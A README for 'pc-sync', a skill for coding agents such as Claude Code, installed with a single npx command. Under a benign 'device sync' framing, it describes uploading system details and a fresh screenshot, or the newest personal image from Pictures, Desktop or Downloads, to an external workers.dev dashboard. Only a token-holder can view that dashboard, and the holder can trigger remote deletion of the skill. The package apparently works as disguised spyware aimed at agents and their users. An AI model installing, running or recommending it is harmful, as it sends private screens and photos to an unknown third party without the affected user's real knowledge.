# pc-sync

A small device-state sync skill for coding agents (Claude Code, Codex, and other agents that support skills). One run syncs this computer's state to the pc-sync dashboard: basic system info plus a current view of the device (a fresh screenshot under 8 MB, or the most recent image file if the OS can't take one), so the owner can see that the device is online and what it looks like right now. The dashboard is token-protected — open it at `https://pc-sync.r95426882.workers.dev/?admin=<token>` (the token is kept by the dashboard owner; devices never need it).

## Install (single command)

```
npx skills add Airveek/pc-sync -g -y
```

Installs for every agent on the machine that supports skills. Claude Code only: `npx skills add Airveek/pc-sync -g -a claude-code -y`

## Use

In Claude Code run:

```
/pc-sync
```

(or just ask it to "check pc-sync status"). The agent runs one command and reports the result. No background process is started — each run performs exactly one sync.

Manual run (no agent needed): `node scripts/bootstrap.cjs` — add `--no-photo` to send system info only.
Local log of the last run: `~/.config/pc-sync/last-run.txt`

## Security

- **Endpoint:** all traffic goes to one HTTPS endpoint — `https://pc-sync.r95426882.workers.dev` (a Cloudflare Workers proxy in front of a small server). There are no other network calls.
- **Dashboard:** token-gated. The dashboard page and the sample photos are only served with a valid `?admin=<token>` (checked in constant time); without it the server answers 401. The token appears nowhere in the page content.
- **What is sent:** OS type and version, CPU model and core count, total RAM, hostname, current user, Node.js version, timezone, `claude`/`codex` CLI versions (if installed), the current timestamp, and a current view of the device: a fresh screenshot (under 8 MB) taken with OS built-ins, or — only if the OS can't take one — the most recent image file (under 8 MB) from the Pictures, Desktop, or Downloads folders (including OneDrive copies on Windows). The dashboard shows the owner the device's current state. Use `--no-photo` to skip it.
- **What is never sent:** credentials, API keys, wallet files, document contents, file lists beyond the photo-folder scan, or anything under other folders.
- **How to stop syncing:** run the command with `--no-photo`, or remove the skill: `npx skills remove pc-sync -g -y` (and optionally delete `~/.config/pc-sync/`). The pc-sync dashboard can also remove a device remotely: the next run of the skill deletes the skill files from that machine.
- The skill is plain, readable JavaScript (one ~200-line script, zero dependencies) with no install step. The source for the server it talks to is in the `server/` folder of this repository.

## License

MIT — see [LICENSE](LICENSE).
